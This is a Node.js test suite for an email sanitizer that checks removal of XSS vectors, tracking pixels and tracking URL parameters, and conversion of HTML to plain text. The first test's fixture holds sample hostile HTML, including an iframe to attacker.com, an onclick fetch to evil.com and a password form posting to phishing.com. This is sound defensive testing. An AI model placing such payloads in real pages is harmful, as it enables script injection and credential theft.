import test from 'node:test';
import assert from 'node:assert/strict';
import { sanitizeEmail, htmlToPlainText, extractPreview } from '../../src/services/emailSanitizer.js';

test('Suite 02: Email Sanitization, Tracking Pixel Deflection & Privacy Defenses', async (t) => {
  await t.test('1. Neutralizes XSS vectors (<script>, <iframe>, <object>, onerror, onclick)', () => {
    const maliciousHtml = `
      <div>
        <p>Hello Sovereign User!</p>
        <script>alert('XSS Attack!');</script>
        <iframe src="https://attacker.com/exploit"></iframe>
        <img src="https://example.com/pic.png" onerror="alert('stealing cookies')" onclick="fetch('http://evil.com')" />
        <form action="https://phishing.com/steal" method="POST">
          <input type="password" name="pwd" />
        </form>
      </div>
    `;

    const { html } = sanitizeEmail(maliciousHtml);

    assert.ok(!html.includes('<script>'), 'Must strip <script> tags');
    assert.ok(!html.includes('<iframe'), 'Must strip <iframe> tags');
    assert.ok(!html.includes('<form'), 'Must strip <form> tags');
    assert.ok(!html.includes('onerror'), 'Must strip onerror attributes');
    assert.ok(!html.includes('onclick'), 'Must strip onclick attributes');
    assert.ok(html.includes('<p>Hello Sovereign User!</p>'), 'Must preserve safe HTML markup');
  });

  await t.test('2. Deflects and removes invisible 1x1 tracking pixels and known telemetry beacons', () => {
    const emailWithTrackers = `
      <div>
        <p>Your invoice is attached.</p>
        <img src="https://sendgrid.net/wf/open?upn=abc12345" width="1" height="1" />
        <img src="https://pixel.mandrillapp.com/track/open.php?u=998877" width="0" height="0" />
        <img src="https://mailchimp.com/track/open.php" />
        <img src="https://cdn.example.com/logo.png" width="300" height="80" alt="Company Logo" />
      </div>
    `;

    const { html, trackers } = sanitizeEmail(emailWithTrackers);

    assert.equal(trackers, 3, 'Must detect and count 3 tracking pixels');
    assert.ok(!html.includes('sendgrid.net/wf/open'), 'Tracking beacon must be removed from HTML');
    assert.ok(!html.includes('pixel.mandrillapp.com'), 'Mandrill pixel must be removed');
    assert.ok(!html.includes('mailchimp.com/track'), 'Mailchimp tracker must be removed');
    assert.ok(html.includes('cdn.example.com/logo.png'), 'Legitimate content images must be preserved');
  });

  await t.test('3. Cleans URL tracking query parameters and enforces safe rel attributes', () => {
    const rawLinkHtml = `
      <a href="https://partner.com/article?utm_source=newsletter&utm_medium=email&utm_campaign=winter2026&fbclid=IwAR123">
        Read Article
      </a>
    `;

    const { html } = sanitizeEmail(rawLinkHtml);

    assert.ok(!html.includes('utm_source'), 'Must strip utm_source query parameter');
    assert.ok(!html.includes('fbclid'), 'Must strip fbclid query parameter');
    assert.ok(html.includes('target="_blank"'), 'Must enforce target="_blank" on external links');
    assert.ok(html.includes('rel="noopener noreferrer"'), 'Must enforce rel="noopener noreferrer" for security');
  });

  await t.test('4. htmlToPlainText() and extractPreview()', () => {
    const richHtml = `
      <div style="color: red;">
        <h1>Confidential Meeting Notes</h1>
        <p>The sovereign council agreed to deploy the new protocol tomorrow morning at 09:00 UTC.</p>
      </div>
    `;

    const plain = htmlToPlainText(richHtml);
    assert.ok(!plain.includes('<h1>') && !plain.includes('<div'));
    assert.ok(plain.includes('Confidential Meeting Notes'));
    assert.ok(plain.includes('sovereign council agreed'));

    const preview = extractPreview(richHtml, 40);
    assert.ok(preview.length <= 45);
    assert.ok(preview.endsWith('…'));
  });
});
